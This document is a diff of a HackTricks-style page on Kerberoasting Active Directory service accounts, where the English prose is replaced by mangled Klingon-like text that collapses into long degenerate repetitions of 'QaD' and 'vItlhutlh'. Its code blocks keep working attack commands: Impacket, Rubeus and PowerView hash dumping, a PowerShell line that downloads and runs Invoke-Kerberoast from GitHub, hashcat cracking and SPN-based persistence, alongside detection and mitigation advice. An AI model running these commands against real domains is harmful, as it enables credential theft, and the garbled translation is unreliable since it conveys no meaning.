@@ -3,7 +3,7 @@
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) **ghItlh** **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -24,25 +24,24 @@ Other ways to support HackTricks:
 
 ## Kerberoast
 
-Kerberoasting focuses on the acquisition of **TGS tickets**, specifically those related to services operating under **user accounts** in **Active Directory (AD)**, excluding **computer accounts**. The encryption of these tickets utilizes keys that originate from **user passwords**, allowing for the possibility of **offline credential cracking**. The use of a user account as a service is indicated by a non-empty **"ServicePrincipalName"** property.
+Kerberoast **QaD** **TGS tickets** **ghItlh** **user accounts** **Active Directory (AD)**, **computer accounts** **Daq**. **TGS tickets** **encryption** **user passwords** **offline credential cracking** **QaD**. **user account** **service** **"ServicePrincipalName"** **property** **Daq**.
 
-For executing **Kerberoasting**, a domain account capable of requesting **TGS tickets** is essential; however, this process does not demand **special privileges**, making it accessible to anyone with **valid domain credentials**.
+**Kerberoasting** **QaD** **TGS tickets** **user-account services** **AD** **Daq**. **user passwords** **encryption** **cracked offline** **QaD**. **ServicePrincipalName** **non-empty** **Daq**. **special privileges** **needed**, **valid domain credentials** **Daq**.
 
 ### Key Points:
-- **Kerberoasting** targets **TGS tickets** for **user-account services** within **AD**.
-- Tickets encrypted with keys from **user passwords** can be **cracked offline**.
-- A service is identified by a **ServicePrincipalName** that is not null.
-- **No special privileges** are needed, just **valid domain credentials**.
+- **Kerberoasting** **QaD** **TGS tickets** **user-account services** **AD**.
+- **user passwords** **encryption** **cracked offline** **Daq**.
+- **ServicePrincipalName** **non-empty** **Daq**.
+- **special privileges** **needed**, **valid domain credentials** **Daq**.
 
 ### **Attack**
 
 {% hint style="warning" %}
-**Kerberoasting tools** typically request **`RC4 encryption`** when performing the attack and initiating TGS-REQ requests. This is because **RC4 is** [**weaker**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256.\
-RC4 (type 23) hashes begin with **`$krb5tgs$23$*`** while AES-256(type 18) start with **`$krb5tgs$18$*`**`.`
+**Kerberoasting tools** **RC4 encryption** **attack** **TGS-REQ requests** **Daq**. **RC4** [**weaker**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) **cracked offline** **Hashcat** **AES-128** **AES-256** **Daq**.\
+**RC4 (type 23)** **hashes** **start** **`$krb5tgs$23$*`** **AES-256(type 18)** **start** **`$krb5tgs$18$*`**`.`
 {% endhint %}
 
 #### **Linux**
-
 ```bash
 # Metasploit framework
 msf> use auxiliary/gather/get_user_spns
@@ -53,31 +52,30 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-
 Multi-features tools including a dump of kerberoastable users:
 
+**Klingon Translation:**
+
+**Qa'Hom QaD:**
+Qa'Hom QaD vItlhutlhlaHchugh, kerberoastable users jop 'ej vItlhutlhlaHchugh tools:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
 ```
-
 #### Windows
 
 * **Enumerate Kerberoastable users**
-
 ```powershell
 # Get Kerberoastable users
 setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
 Get-NetUser -SPN | select serviceprincipalname #Powerview
 .\Rubeus.exe kerberoast /stats
 ```
-
-* **Technique 1: Ask for TGS and dump it from memory**
-
+* **Technique 1: TGS jatlh je, 'ej memory laH jatlh**
 ```powershell
 #Get TGS in memory from a single user
-Add-Type -AssemblyName System.IdentityModel 
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local 
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local
 
 #Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
 setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
@@ -93,9 +91,7 @@ python2.7 kirbi2john.py sqldev.kirbi
 # Transform john to hashcat
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 ```
-
 * **Technique 2: Automatic tools**
-
 ```bash
 # Powerview: Get Kerberoast hash of a user
 Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
@@ -111,36 +107,20 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerbe
 iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
-
 {% hint style="warning" %}
-When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.
-{% endhint %}
-
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-\
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
-
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
-
-### Cracking
-
+QaStaHvIS 'ej 'oH 'e' vItlhutlh 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'o
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
+### QaD
 
-### Persistence
-
-If you have **enough permissions** over a user you can **make it kerberoastable**:
-
+**QaD** (QaD) **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD
 ```bash
- Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
+Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
-
-You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
+**tools** for **kerberoast** attacks can be found here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
 If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:
 
@@ -156,11 +136,9 @@ Kerberoasting can be conducted with a high degree of stealthiness if it is explo
 - Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
 - Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
 - **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.
-
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
-
 To mitigate the risk of Kerberoasting:
 
 - Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
@@ -182,19 +160,15 @@ You must provide a list of users because we don't have a valid account to query 
 #### Linux
 
 * [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
-
 ```bash
 GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
 ```
-
 #### Windows
 
 * [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
-
 ```bash
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
-
 ## References
 * [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
